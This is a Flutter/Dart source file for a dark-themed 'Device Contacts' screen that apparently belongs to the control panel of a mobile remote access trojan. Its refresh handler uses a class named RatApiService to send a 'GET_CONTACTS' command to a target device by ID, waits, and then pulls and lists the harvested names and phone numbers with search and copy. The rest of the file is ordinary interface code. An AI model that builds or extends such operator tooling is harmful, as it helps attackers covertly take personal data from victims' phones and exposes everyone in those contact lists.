import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'api_service.dart';

// ============================================================
// GRID PATTERN PAINTER
// ============================================================
class _ContactsGridPatternPainter extends CustomPainter {
  final Color gridColor;
  final double spacing;
  
  const _ContactsGridPatternPainter({
    required this.gridColor,
    this.spacing = 25,
  });
  
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = gridColor
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.6;
    
    for (double x = 0; x < size.width; x += spacing) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    
    for (double y = 0; y < size.height; y += spacing) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }
  
  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

const _kBg   = Color(0xFF111827);
const _kCard = Color(0xFF1F2937);
const _kBlue = Color(0xFF3B82F6);
const _kCyan = Color(0xFF06B6D4);
const _kSub  = Color(0xFF9CA3AF);

class ContactsScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;
  final List<dynamic> initialContacts;
  const ContactsScreen({super.key, required this.deviceId, required this.sessionKey, required this.initialContacts});

  @override
  State<ContactsScreen> createState() => _ContactsScreenState();
}

class _ContactsScreenState extends State<ContactsScreen> {
  late List<dynamic> _all;
  List<dynamic> _filtered = [];
  final _search = TextEditingController();
  bool _isLoading = false;

  @override
  void initState() {
    super.initState();
    _all = widget.initialContacts;
    _filtered = _all;
    _search.addListener(_onSearch);
  }

  @override
  void dispose() { _search.dispose(); super.dispose(); }

  void _onSearch() {
    final q = _search.text.toLowerCase();
    setState(() {
      _filtered = _all.where((c) {
        return (c['name'] ?? '').toString().toLowerCase().contains(q) ||
               (c['number'] ?? '').toString().toLowerCase().contains(q);
      }).toList();
    });
  }

  Future<void> _refresh() async {
    setState(() => _isLoading = true);
    try {
      final api = RatApiService(widget.sessionKey);
      await api.sendCommand(widget.deviceId, 'GET_CONTACTS');
      await Future.delayed(const Duration(seconds: 4));
      final nc = await api.getContacts(widget.deviceId);
      if (nc.isNotEmpty) {
        setState(() { _all = nc; _onSearch(); });
      } else {
        _snack('No contacts received yet. Try again.');
      }
    } catch (e) { _snack('Error: $e'); }
    finally { if (mounted) setState(() => _isLoading = false); }
  }

  void _snack(String m) => ScaffoldMessenger.of(context).showSnackBar(
    SnackBar(content: Text(m), backgroundColor: _kCard, behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)), margin: const EdgeInsets.all(16)),
  );

  Widget _buildGridBackground() {
    return Positioned.fill(
      child: CustomPaint(
        painter: _ContactsGridPatternPainter(
          gridColor: Colors.white.withOpacity(0.03),
          spacing: 30,
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          _buildGridBackground(),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  Colors.black.withOpacity(0.85),
                  _kBlue.withOpacity(0.05),
                  Colors.black.withOpacity(0.9)
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
            ),
          ),
          SafeArea(
            child: Column(children: [
              // Header
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
                child: Row(children: [
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)), child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white70, size: 16)),
                  ),
                  const SizedBox(width: 12),
                  Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(10), boxShadow: [BoxShadow(color: _kBlue.withOpacity(0.3), blurRadius: 10)]), child: const Icon(Icons.contacts_rounded, color: Colors.white, size: 18)),
                  const SizedBox(width: 12),
                  Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    const Text('Device Contacts', style: TextStyle(color: Colors.white, fontSize: 15, fontWeight: FontWeight.w700)),
                    Text('${_all.length} contacts', style: const TextStyle(color: _kSub, fontSize: 11)),
                  ])),
                  _isLoading
                    ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: _kBlue, strokeWidth: 2))
                    : GestureDetector(
                        onTap: _refresh,
                        child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)), child: const Icon(Icons.refresh_rounded, color: Colors.white70, size: 18)),
                      ),
                ]),
              ),
              // Search
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 12, 16, 0),
                child: TextField(
                  controller: _search,
                  style: const TextStyle(color: Colors.white, fontSize: 14),
                  decoration: InputDecoration(
                    hintText: 'Search contacts...', hintStyle: TextStyle(color: Colors.white.withOpacity(0.3)),
                    filled: true, fillColor: _kCard.withOpacity(0.8),
                    contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 13),
                    border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                    enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _kBlue.withOpacity(0.2))),
                    focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: _kBlue, width: 1.5)),
                    prefixIcon: const Icon(Icons.search_rounded, color: _kSub, size: 20),
                  ),
                ),
              ),
              // List
              Expanded(
                child: _filtered.isEmpty
                  ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [Icon(Icons.contacts_rounded, size: 56, color: Colors.white.withOpacity(0.1)), const SizedBox(height: 12), const Text('No contacts found', style: TextStyle(color: _kSub))]))
                  : ListView.builder(
                      padding: const EdgeInsets.fromLTRB(16, 12, 16, 16),
                      physics: const BouncingScrollPhysics(),
                      itemCount: _filtered.length,
                      itemBuilder: (_, i) {
                        final c = _filtered[i];
                        final name   = c['name'] ?? 'Unknown';
                        final number = c['phoneNumber'] ?? c['number'] ?? 'No Number';
                        final letter = name.isNotEmpty ? name[0].toUpperCase() : '?';
                        return Container(
                          margin: const EdgeInsets.only(bottom: 8),
                          decoration: BoxDecoration(gradient: LinearGradient(colors: [_kCard.withOpacity(0.9), _kBg.withOpacity(0.9)]), borderRadius: BorderRadius.circular(12), border: Border.all(color: _kBlue.withOpacity(0.15))),
                          child: ListTile(
                            leading: Container(
                              width: 42, height: 42,
                              decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(12)),
                              child: Center(child: Text(letter, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w800, fontSize: 16))),
                            ),
                            title: Text(name, style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.w600)),
                            subtitle: Text(number, style: const TextStyle(color: _kSub, fontSize: 12)),
                            trailing: GestureDetector(
                              onTap: () {
                                Clipboard.setData(ClipboardData(text: '$name: $number'));
                                _snack('Copied!');
                              },
                              child: Container(padding: const EdgeInsets.all(7), decoration: BoxDecoration(color: _kBlue.withOpacity(0.1), borderRadius: BorderRadius.circular(8), border: Border.all(color: _kBlue.withOpacity(0.2))), child: const Icon(Icons.copy_rounded, color: _kBlue, size: 16)),
                            ),
                          ),
                        );
                      },
                    ),
              ),
            ]),
          ),
        ],
      ),
    );
  }
}